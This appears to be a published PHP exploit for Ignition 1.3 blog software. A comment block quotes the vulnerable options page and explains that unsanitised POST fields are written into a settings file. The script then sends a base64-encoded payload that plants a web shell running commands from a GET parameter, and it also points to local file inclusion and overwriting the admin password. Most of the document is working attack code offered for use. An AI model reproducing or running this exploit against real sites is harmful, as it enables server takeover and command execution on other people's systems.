 
/*
 
Ignition 1.3 Remote Code Execution Exploit
by cOndemned
download: http://launchpad.net/ignition/trunk/1.3/+download/ignition-1.3.tar.gz
 
 
source of i-options.php
 
    1.  <?php
    2.  session_start();
    3.  if ($_POST[&#039;submit&#039;]) {
    4.  if ($FH = @fopen(&#039;data/settings.php&#039;, &#039;w&#039;)) {
    5.      @fwrite($FH, &#039;<?php $pass = "&#039;.$_POST[&#039;pass&#039;].&#039;";
    6.  $uri = "&#039;.$_POST[&#039;uri&#039;].&#039;";
    7.  $suri = "&#039;.$_POST[&#039;suri&#039;].&#039;";
    8.  $blogtitle = "&#039;.$_POST[&#039;title&#039;].&#039;";
    9.  $description = "&#039;.$_POST[&#039;description&#039;].&#039;";
    10. $postid = "&#039;.$_POST[&#039;id&#039;].&#039;";
    11. $author = "&#039;.$_POST[&#039;author&#039;].&#039;";
    12. $skin = "&#039;.$_POST[&#039;skin&#039;].&#039;";
    13. $gravatar = "&#039;.$_POST[&#039;gravatar&#039;].&#039;";
    14. $twitter = "&#039; . $_POST[&#039;twitter&#039;] . &#039;";
    15. $identica = "&#039; . $_POST[&#039;identica&#039;] . &#039;";
    16. $book = "&#039; . $_POST[&#039;book&#039;] . &#039;";
    17. $game = "&#039; . $_POST[&#039;game&#039;] . &#039;";
    18. $language = "&#039; . $_POST[&#039;lang&#039;] . &#039;";
    19.
    20. require_once("template.php");
    21. require_once("lang/$language.php");&#039;);
    22.     #fclose($FH);
    23. }
 
We can overwrite setting.php by simply sending specially crafted POST request,
and put some evil code into one of the variables. After running my PoC line with
$language var will be:
 
    $language = "en";echo @shell_exec($_GET[&#039;cmd&#039;]);$wtf="";
 
Where "en" is default language and without filling this field correctly admin
will see error while trying to access blog index.
 
other attacks scenarios:
 
    - attacker can use $_POST[&#039;language&#039;] variable to exploit Local File
    Inclusion (lines 18 and 21)
 
    - fill $_POST[&#039;pass&#039;] with new password (md5 hashed) to overwrite admins
    password
 
    - etc...
*/
 
 
$target = &#039;http://localhost/ignition/&#039;;
 
$post = array
(
    &#039;uri&#039;       => $target,
    &#039;suri&#039;      => $target,
    &#039;description&#039;   => &#039;Just another lame php blog script owned :<&#039;,
    &#039;skin&#039;      => &#039;default&#039;,
    &#039;lang&#039;      => base64_decode(&#039;ZW4iO2VjaG8gQHNoZWxsX2V4ZWMoJF9HRVRbJ2NtZCddKTskd3RmPSI=&#039;),
    &#039;submit&#039;    => 1
);
 
$sock = curl_init();
 
curl_setopt_array
(
    $sock,
    array
    (
        CURLOPT_URL         => "$target/i-options.php",
        CURLOPT_RETURNTRANSFER  => true,
        CURLOPT_POST        => true,
        CURLOPT_POSTFIELDS  => http_build_query($post)
    )
);
 
curl_exec($sock);
curl_close($sock);
 
echo "Check: $target/data/settings.php?cmd=[system_command]";
 
?>



